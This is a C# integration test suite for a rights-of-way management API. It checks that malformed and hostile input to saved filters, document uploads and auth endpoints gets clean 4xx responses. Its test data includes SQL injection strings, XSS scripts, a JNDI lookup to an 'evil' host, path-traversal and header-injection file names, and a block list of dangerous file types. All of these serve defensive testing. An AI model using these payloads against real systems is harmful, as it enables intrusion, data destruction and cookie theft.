using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Aurigo.RowManagement.IntegrationTests.Support;
using FluentAssertions;

namespace Aurigo.RowManagement.IntegrationTests;

/// <summary>Hostile, malformed and awkward input, against real Postgres. The answer is always a clean 4xx, never a 500.</summary>
public class InputHardeningTests : IClassFixture<PgApi>
{
    private readonly PgApi _api;
    public InputHardeningTests(PgApi api) => _api = api;

    private static string Filter(string page, string name, string json = "{}") =>
        JsonSerializer.Serialize(new { pageKey = page, name, filterJson = json });

    // ---- request bodies -----------------------------------------------------------------------

    [PgTheory]
    [InlineData("{not json")]
    [InlineData("")]
    [InlineData("null")]
    [InlineData("[]")]
    [InlineData("42")]
    [InlineData("\"just a string\"")]
    [InlineData("{\"pageKey\":123,\"name\":true,\"filterJson\":[]}")]
    [InlineData("{\"pageKey\":null,\"name\":null,\"filterJson\":null}")]
    public async Task A_malformed_saved_filter_body_is_a_400(string body)
    {
        var pm = await _api.As("ProjectManager");

        var response = await pm.PostJson("/api/v1/saved-filters", body);

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest, await response.Content.ReadAsStringAsync());
    }

    [PgFact]
    public async Task A_non_json_content_type_is_refused_cleanly()
    {
        var pm = await _api.As("ProjectManager");

        var response = await pm.Http.PostAsync("/api/v1/saved-filters", new StringContent("name=x", Encoding.UTF8, "text/plain"));

        response.StatusCode.Should().Be(HttpStatusCode.UnsupportedMediaType);
    }

    [PgTheory]
    [InlineData("name\0withnull")]
    [InlineData("\u0000")]
    public async Task A_null_character_in_a_name_is_a_400_not_a_database_error(string name)
    {
        var pm = await _api.As("ProjectManager");

        var response = await pm.PostJson("/api/v1/saved-filters", Filter("parcels", name));

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest, await response.Content.ReadAsStringAsync());
    }

    [PgFact]
    public async Task A_null_character_inside_the_filter_json_is_a_400_not_a_database_error()
    {
        var pm = await _api.As("ProjectManager");

        // jsonb cannot store \u0000; Postgres would otherwise reject it deep in the save.
        var response = await pm.PostJson("/api/v1/saved-filters", Filter("parcels", "nul", "{\"q\":\"a\\u0000b\"}"));

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest, await response.Content.ReadAsStringAsync());
    }

    [PgFact]
    public async Task Deeply_nested_filter_json_is_refused_not_a_stack_overflow()
    {
        var pm = await _api.As("ProjectManager");
        var deep = new string('[', 5000) + new string(']', 5000);

        var response = await pm.PostJson("/api/v1/saved-filters", Filter("parcels", "deep", "{\"a\":" + deep + "}"));

        ((int)response.StatusCode).Should().BeInRange(400, 499);
    }

    [PgTheory]
    [InlineData(100, HttpStatusCode.Created)]
    [InlineData(101, HttpStatusCode.BadRequest)]
    [InlineData(1, HttpStatusCode.Created)]
    public async Task The_name_length_limit_is_exact(int length, HttpStatusCode expected)
    {
        var pm = await _api.As("ProjectManager");

        var response = await pm.PostJson("/api/v1/saved-filters", Filter("parcels", new string('n', length)));

        response.StatusCode.Should().Be(expected);
    }

    [PgFact]
    public async Task Filter_json_at_the_size_limit_is_accepted_and_one_byte_over_is_refused()
    {
        var pm = await _api.As("ProjectManager");
        string JsonOfSize(int total) => "{\"q\":\"" + new string('a', total - 8) + "\"}";

        (await pm.PostJson("/api/v1/saved-filters", Filter("parcels", "at-limit", JsonOfSize(16 * 1024)))).StatusCode.Should().Be(HttpStatusCode.Created);
        (await pm.PostJson("/api/v1/saved-filters", Filter("parcels", "over-limit", JsonOfSize(16 * 1024 + 1)))).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [PgTheory]
    [InlineData("O'Brien & Sons \"Parcels\"")]
    [InlineData("'; DROP TABLE roles; --")]
    [InlineData("Robert'); DELETE FROM documents;--")]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("${jndi:ldap://evil/x}")]
    [InlineData("名前 · Ünïcödé · 🚧 · مرحبا")]
    [InlineData("  padded  ")]
    public async Task Awkward_text_is_stored_literally_and_never_executed(string name)
    {
        var pm = await _api.As("ProjectManager");
        var pageKey = "projects";

        var created = await pm.PostJson("/api/v1/saved-filters", Filter(pageKey, name));
        created.StatusCode.Should().Be(HttpStatusCode.Created, await created.Content.ReadAsStringAsync());

        var list = await pm.ReadJson(await pm.Http.GetAsync($"/api/v1/saved-filters?pageKey={pageKey}"));
        list.EnumerateArray().Select(f => f.GetProperty("name").GetString()).Should().Contain(name.Trim());

        // The tables are all still there and still full.
        (await PgTestDatabase.ScalarAsync(_api.Database, "select count(*) from roles")).Should().Be(Spec.Roles.Length);
    }

    [PgTheory]
    [InlineData("not-a-page")]
    [InlineData("")]
    [InlineData("PARCELS")]       // page keys are exact
    [InlineData("parcels ")]
    [InlineData("parcels'--")]
    public async Task An_unknown_page_key_is_a_400(string pageKey)
    {
        var pm = await _api.As("ProjectManager");

        (await pm.PostJson("/api/v1/saved-filters", Filter(pageKey, "x"))).StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await pm.Http.GetAsync($"/api/v1/saved-filters?pageKey={Uri.EscapeDataString(pageKey)}")).StatusCode.Should().BeOneOf(HttpStatusCode.BadRequest, HttpStatusCode.OK);
    }

    [PgFact]
    public async Task A_missing_page_key_on_list_is_not_a_500()
    {
        var pm = await _api.As("ProjectManager");

        var response = await pm.Http.GetAsync("/api/v1/saved-filters");

        ((int)response.StatusCode).Should().BeInRange(200, 499);
    }

    [PgTheory]
    [InlineData("not-a-guid")]
    [InlineData("123")]
    [InlineData("00000000-0000-0000-0000-000000000000")]
    public async Task Ids_in_the_route_that_do_not_exist_are_404s(string id)
    {
        var admin = await _api.As("Admin");

        (await admin.Http.DeleteAsync($"/api/v1/saved-filters/{id}")).StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await admin.Http.DeleteAsync($"/api/v1/documents/{id}")).StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await admin.Http.GetAsync($"/api/v1/documents/{id}/content")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    // ---- uploads -------------------------------------------------------------------------------

    [PgFact]
    public async Task An_upload_with_no_multipart_body_is_a_clean_4xx()
    {
        var admin = await _api.As("Admin");

        var json = await admin.PostJson("/api/v1/documents", "{}");
        var empty = await admin.Http.PostAsync("/api/v1/documents", new MultipartFormDataContent());

        ((int)json.StatusCode).Should().BeInRange(400, 499);
        ((int)empty.StatusCode).Should().BeInRange(400, 499);
    }

    [PgFact]
    public async Task A_multipart_with_the_file_under_the_wrong_field_name_is_a_400()
    {
        var admin = await _api.As("Admin");
        var form = new MultipartFormDataContent
        {
            { new StringContent("Parcel"), "entityType" },
            { new StringContent(Guid.NewGuid().ToString()), "entityId" },
            { new ByteArrayContent(new byte[] { 1, 2, 3 }), "attachment", "a.pdf" },
        };

        (await admin.Http.PostAsync("/api/v1/documents", form)).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [PgTheory]
    [InlineData("")]
    [InlineData("not-a-guid")]
    [InlineData("00000000-0000-0000-0000-000000000000")]
    public async Task An_upload_with_a_bad_entity_id_is_a_400(string entityId)
    {
        var admin = await _api.As("Admin");
        var form = new MultipartFormDataContent
        {
            { new StringContent("Parcel"), "entityType" },
            { new StringContent(entityId), "entityId" },
            { new ByteArrayContent(new byte[] { 1 }), "file", "a.pdf" },
        };

        (await admin.Http.PostAsync("/api/v1/documents", form)).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [PgTheory]
    [InlineData("a.pdf")]
    [InlineData("A.PDF")]
    [InlineData("deed.docx")]
    [InlineData("sheet.xlsx")]
    [InlineData("data.csv")]
    [InlineData("notes.txt")]
    [InlineData("photo.jpg")]
    [InlineData("photo.jpeg")]
    [InlineData("scan.png")]
    [InlineData("scan.tif")]
    [InlineData("scan.tiff")]
    [InlineData("site.heic")]
    [InlineData("survey.dwg")]
    [InlineData("survey.dgn")]
    [InlineData("old.doc")]
    [InlineData("old.xls")]
    public async Task Every_allowed_file_type_uploads_and_round_trips(string fileName)
    {
        var admin = await _api.As("Admin");
        var bytes = Encoding.UTF8.GetBytes("content of " + fileName);

        var upload = await admin.Upload("Parcel", Guid.NewGuid(), fileName, bytes);
        upload.StatusCode.Should().Be(HttpStatusCode.Created, await upload.Content.ReadAsStringAsync());
        var id = (await admin.ReadJson(upload)).GetProperty("id").GetGuid();

        var download = await admin.Http.GetAsync($"/api/v1/documents/{id}/content");
        (await download.Content.ReadAsByteArrayAsync()).Should().Equal(bytes);
    }

    [PgTheory]
    [InlineData("malware.exe")]
    [InlineData("script.js")]
    [InlineData("page.html")]
    [InlineData("page.htm")]
    [InlineData("image.svg")]
    [InlineData("archive.zip")]
    [InlineData("macro.docm")]
    [InlineData("run.bat")]
    [InlineData("run.ps1")]
    [InlineData("shortcut.lnk")]
    [InlineData("deed.pdf.exe")]
    [InlineData("noextension")]
    [InlineData("deed.pdf.")]
    [InlineData("deed.pdf ")]
    public async Task Dangerous_or_unknown_file_types_are_refused(string fileName)
    {
        var admin = await _api.As("Admin");

        var response = await admin.Upload("Parcel", Guid.NewGuid(), fileName, new byte[] { 1, 2, 3 });

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest, fileName);
    }

    [PgTheory]
    [InlineData("../../../etc/passwd.pdf")]
    [InlineData("..\\..\\windows\\system32\\evil.pdf")]
    [InlineData("a\r\nSet-Cookie: pwn=1\r\n.pdf")]
    [InlineData("C:\\Users\\victim\\secret.pdf")]
    [InlineData("na\0me.pdf")]
    [InlineData("quote\"in\"name.pdf")]
    [InlineData("名前 ünï 🚧.pdf")]
    public async Task Hostile_file_names_are_cleaned_and_cannot_break_the_download_headers(string fileName)
    {
        var admin = await _api.As("Admin");
        var upload = await admin.Http.PostAsync("/api/v1/documents", TestUser.RawUpload("Parcel", Guid.NewGuid(), fileName.Replace("\\", "\\\\").Replace("\"", "%22"), new byte[] { 1, 2, 3 }));
        ((int)upload.StatusCode).Should().BeInRange(201, 499);
        upload.StatusCode.Should().BeOneOf(HttpStatusCode.Created, HttpStatusCode.BadRequest);
        if (upload.StatusCode != HttpStatusCode.Created) return;

        var dto = await admin.ReadJson(upload);
        dto.GetProperty("fileName").GetString().Should().NotContainAny("/", "\\", "\0", "\r", "\n");

        var download = await admin.Http.GetAsync($"/api/v1/documents/{dto.GetProperty("id").GetGuid()}/content");
        download.StatusCode.Should().Be(HttpStatusCode.OK);
        download.Headers.Contains("Set-Cookie").Should().BeFalse("a file name must never inject response headers");
        download.Content.Headers.ContentDisposition!.DispositionType.Should().Be("attachment");
    }

    [PgFact]
    public async Task A_bare_extension_gets_a_default_name()
    {
        var admin = await _api.As("Admin");

        var response = await admin.Upload("Parcel", Guid.NewGuid(), ".pdf", new byte[] { 1 });

        response.StatusCode.Should().Be(HttpStatusCode.Created);
        (await admin.ReadJson(response)).GetProperty("fileName").GetString().Should().Be("file.pdf");
    }

    [PgFact]
    public async Task A_long_file_name_is_shortened_up_to_255_characters_and_refused_beyond()
    {
        var admin = await _api.As("Admin");

        var ok = await admin.Upload("Parcel", Guid.NewGuid(), new string('a', 256) + ".pdf", new byte[] { 1 });
        var tooLong = await admin.Upload("Parcel", Guid.NewGuid(), new string('a', 257) + ".pdf", new byte[] { 1 });

        ok.StatusCode.Should().Be(HttpStatusCode.Created);
        (await admin.ReadJson(ok)).GetProperty("fileName").GetString()!.Length.Should().BeLessOrEqualTo(150);
        tooLong.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [PgTheory]
    [InlineData("")]
    [InlineData("Deed")]
    [InlineData("Title Commitment (v2)")]
    public async Task Document_type_and_description_are_optional_free_text(string docType)
    {
        var admin = await _api.As("Admin");

        var response = await admin.Upload("Parcel", Guid.NewGuid(), "a.pdf", new byte[] { 1 }, docType);

        response.StatusCode.Should().Be(HttpStatusCode.Created, await response.Content.ReadAsStringAsync());
    }

    [PgFact]
    public async Task Absurd_document_type_or_description_lengths_are_a_400_not_a_database_error()
    {
        var admin = await _api.As("Admin");
        var form = TestUser.Form("Parcel", Guid.NewGuid(), "a.pdf", new byte[] { 1 }, new string('d', 5000));
        form.Add(new StringContent(new string('x', 100_000)), "description");

        var response = await admin.Http.PostAsync("/api/v1/documents", form);

        ((int)response.StatusCode).Should().BeInRange(400, 499);
    }

    [PgFact]
    public async Task A_document_type_with_a_null_character_is_a_400_not_a_database_error()
    {
        var admin = await _api.As("Admin");

        var response = await admin.Upload("Parcel", Guid.NewGuid(), "a.pdf", new byte[] { 1 }, "bad\0type");

        ((int)response.StatusCode).Should().BeInRange(400, 499);
    }

    [PgFact]
    public async Task Binary_content_survives_byte_for_byte()
    {
        var admin = await _api.As("Admin");
        var bytes = new byte[2 * 1024 * 1024 + 17];
        new Random(42).NextBytes(bytes);

        var upload = await admin.Upload("Parcel", Guid.NewGuid(), "scan.tif", bytes);
        var dto = await admin.ReadJson(upload);
        var download = await admin.Http.GetAsync($"/api/v1/documents/{dto.GetProperty("id").GetGuid()}/content");

        dto.GetProperty("sizeBytes").GetInt64().Should().Be(bytes.Length);
        (await download.Content.ReadAsByteArrayAsync()).Should().Equal(bytes);
    }

    [PgFact]
    public async Task A_file_labelled_pdf_that_is_really_html_is_served_as_a_download_never_rendered()
    {
        var admin = await _api.As("Admin");
        var upload = await admin.Upload("Parcel", Guid.NewGuid(), "innocent.pdf", Encoding.UTF8.GetBytes("<html><script>alert(document.cookie)</script></html>"));
        var id = (await admin.ReadJson(upload)).GetProperty("id").GetGuid();

        var download = await admin.Http.GetAsync($"/api/v1/documents/{id}/content");

        download.Content.Headers.ContentType!.MediaType.Should().Be("application/pdf");
        download.Content.Headers.ContentDisposition!.DispositionType.Should().Be("attachment");
        download.Headers.GetValues("X-Content-Type-Options").Should().Contain("nosniff");
    }

    [PgFact]
    public async Task Query_strings_with_hostile_values_do_not_break_listing()
    {
        var admin = await _api.As("Admin");

        foreach (var type in new[] { "Parcel'--", "' OR 1=1 --", "%00", new string('x', 5000), "Parcel%27%3B%20DROP%20TABLE%20documents%3B--" })
        {
            var response = await admin.Http.GetAsync($"/api/v1/documents?entityType={type}&entityId={Guid.NewGuid()}");
            ((int)response.StatusCode).Should().BeInRange(400, 499, type);
        }
        (await PgTestDatabase.ScalarAsync(_api.Database, "select count(*) from roles")).Should().Be(Spec.Roles.Length);
    }

    [PgFact]
    public async Task Auth_endpoints_reject_malformed_input_cleanly()
    {
        var anon = _api.Factory.CreateClient();
        foreach (var (url, body) in new[]
        {
            ("/api/v1/auth/login", "{}"), ("/api/v1/auth/login", "{\"email\":null,\"password\":null}"),
            ("/api/v1/auth/login", "{\"email\":\"not-an-email\",\"password\":\"x\"}"),
            ("/api/v1/auth/login", "{\"email\":\"" + new string('a', 5000) + "@x.com\",\"password\":\"" + new string('p', 100000) + "\"}"),
            ("/api/v1/auth/forgot-password", "{}"), ("/api/v1/auth/forgot-password", "{\"email\":\"a\\u0000b@x.com\"}"),
            ("/api/v1/auth/activate", "{\"token\":\"\",\"password\":\"\"}"), ("/api/v1/auth/activate", "{\"token\":\"x\\u0000y\",\"password\":\"Aa1!aaaaaa\"}"),
            ("/api/v1/auth/reset-password", "{}"), ("/api/v1/auth/reset-password", "garbage"),
        })
        {
            var response = await anon.PostAsync(url, new StringContent(body, Encoding.UTF8, "application/json"));
            ((int)response.StatusCode).Should().BeInRange(400, 499, $"{url} <- {body[..Math.Min(60, body.Length)]}");
        }
    }
}
